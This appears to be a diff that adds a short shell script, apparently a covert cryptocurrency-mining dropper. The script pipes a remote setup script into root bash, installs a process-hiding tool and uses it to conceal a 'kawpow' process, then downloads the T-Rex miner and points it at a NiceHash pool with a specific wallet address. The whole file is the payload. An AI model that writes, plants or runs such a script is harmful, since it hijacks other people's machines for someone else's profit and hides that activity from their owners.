@@ -1,0 +1,2 @@
+#!/bin/sh
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add kawpow" && wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xf t-rex-0.26.8-linux.tar.gz && ./t-rex -a kawpow -o stratum+tcp://kawpow.auto.nicehash.com:9200 -u 36V57H48rCci555AqAMbKQoLdRvp91m8JA.STRONG --timeout 120
